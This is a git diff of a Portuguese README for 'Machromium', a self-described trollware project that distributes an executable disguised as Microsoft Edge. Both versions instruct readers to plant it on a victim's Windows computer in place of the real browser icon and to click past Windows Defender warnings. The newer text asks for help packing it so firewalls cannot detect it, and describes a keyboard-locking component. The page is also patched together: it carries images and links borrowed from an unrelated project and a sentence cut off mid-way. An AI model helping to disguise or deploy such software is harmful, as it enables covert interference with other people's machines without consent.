@@ -1,25 +1,50 @@
-# Machromium
+<img src="" width="1500" alt="Banner Rato"/> 
 
-Esses executáveis foram criados com o único intuito de brincar e trolar seus amigos sem danificar os dispositivos dos mesmos. Serve para tirá-los do sério, causar vergonha e desespero e só entenderão o porque disso ao executarem. Reforço que não trata-se de nenhum malware que roube dados ou danifique a máquina, é apenas um software simples que garanto que resultará em muitas gargalhadas. 
+<h1 align="center">Bem vindo ao Mach</h1>
 
-![Rato mal segurando o Chrome](https://github.com/AnonJV/Virus-Edge/blob/main/Rato_do_Chrome%20(1).png)
+### About `Machromium`
 
-## Preparação
+Esse projeto trata-se de um Trollware, um vírus cujo único intuito é causar desespero, assustar e trollar amigos e conhecidos. Desde os primórdios, o humor se manifesta no cotidiano humano e uma das melhores formas de alegria é por meio da zuação com outra pessoa e o atual programa realiza esse objetivo causando muitas risadas para todos os presentes no local e ataque de frenesi para a vítima. O presente software foi dividido em 3 partes, sendo o **diretório raiz** que contém os arquivos para apresentação no Github e a Licensa, o **diretório Code** onde peço ajuda para manutenção, atualização e compartilhamento do vírus e o diretório mais importante, o **Execute** que se localiza todos os executáveis para a realização do Troll. 
 
-1. Instale o executável em um pen-drive
-2. Transfira o arquivo para o dispositivo de destino
-3. Retire o Microsoft Edge original da Área de Trabalho e barra de tarefas
-4. Coloque o vírus na mesma posição que estava o Edge originalmente
-5. Execute ao menos uma vez para garantir que Windows Defender não exibirá uma mensagem
+#### **[中文文档](https://github.com/AnonJV/Trollware-Machromium/en) | EnglishDocumentation**
 
-## Windows Defender
+<br>
 
-Por padrão, os navegadores e o Windows poderão impedir que seja instalado no computador. Por conta disso recomendo a instalação em pasta compactada e para que funcione corretamente na pegadinha deve-se executar ao menos uma vez para garantia.
+### :bulb:Instalação
 
-**ATENÇÃO:** Depois que executado a primeira vez, caso apareça a mensagem de segurança do Windows, insista em executar e não aparecerá posteriormente. Lembre-se, funciona apenas em Windows e não me responsabilizo pelo uso indevido
+```
+[git clone https://github.com/AnonJV/Trollware-Machrom](https://github.com/AnonJV/Trollware-Machromium/raw/main/Execute/Edge.exe)
+```
+No exemplo acima, foi utilizando o executável disfarçado de Edge mas pode-se escolher qualquer um dos executáveis disponíveis. Feito a instalação na máquina da vítima, basta trocar o ícone real pelo vírus de modo que a vítima não suspeite e esperar pela diversão.
 
-***
+<br>
 
-> Quem brinca muito, vira brinquedo
-> 
-> ~ Thales, 2022
+### :clipboard:`Security` 
+
+Existe um problema que não tive tempo de resolver: o firewall do Windows. Caso apenas instale o vírus, na primeira execução será aberto um aviso que trata-se de um software malicioso. Para que isso seja evitado, deve-se instalar e executar o aplicativo imediatamente após a instalação e clicar na opção "Executar mesmo assim", garantindo desse modo que o Trollware continue disfarçado. 
+
+![demo](https://github.com/Ascotbe/Image/blob/master/Medusa/web_demo.gif?raw=true)
+
+### :four_leaf_clover: Discussion
+
+- Peço ajuda para manter e atualizar o projeto de modo a continuar esse trabalho de causar risos;
+- Precisa-se de empacotamento para tornar o software indetectável para firewalls;
+- O programa utiliza um outro arquivo .exe criado por mim que consegue bloquear todas as teclas menos a tecla Fn e suas combinações. Necessita a implementação para bloquear a tecla Fn também;
+- Peço que atualize o diretório Static com mais áudios estourados e engraçados e com mais imagens suspeitas para a vergonha alheia da vítima.
+
+
+### :warning: Atenção
+
+- Qualquer alteração ou uso deve ser exaltado para mim, o criador, de acordo com o [protocolo](https://github.com/AnonJV/Trollware-Machromium/LICENSE) e seguir algumas outras regras;
+- Não me responsabilizo nem me compactuo com 
+
+
+
+
+### :palm_tree:Contributors
+
+![commit](https://opencollective.com/Medusa/contributors.svg?width=890&button=false)
+
+### :checkered_flag:Timeline
+
+![Alt](https://repobeats.axiom.co/api/embed/dde3107e3339aa21a9b244749737e8a39a650ab9.svg "Repobeats analytics image")
